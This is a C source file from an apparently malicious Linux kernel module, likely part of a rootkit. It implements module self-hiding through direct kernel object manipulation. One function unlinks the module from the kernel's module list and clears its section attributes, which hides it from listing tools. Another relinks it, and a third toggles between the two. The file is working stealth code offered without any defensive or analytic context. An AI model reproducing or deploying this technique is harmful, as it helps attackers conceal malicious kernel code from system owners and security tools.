#include "hidder.h"

bool hide_module = false;
static struct list_head *lkm_list;

void set_dkom_lkm ( void )
{
	if (hide_module)
		return;

	while(!mutex_trylock(&module_mutex))
	{
		cpu_relax();
	}
	lkm_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
	hide_module = true;
}


void unset_dkom_lkm ( void )
{
	if (!hide_module)
		return;
	while(!mutex_trylock(&module_mutex))
	{
		cpu_relax();
	}
	list_add(&THIS_MODULE->list, lkm_list);
	mutex_unlock(&module_mutex);
	hide_module = false;
}


int switch_dkom_lkm( void )
{
	if (hide_module)
	{
		unset_dkom_lkm();
		return 0;
	}
	else {
		set_dkom_lkm();
		return 1;
	}
}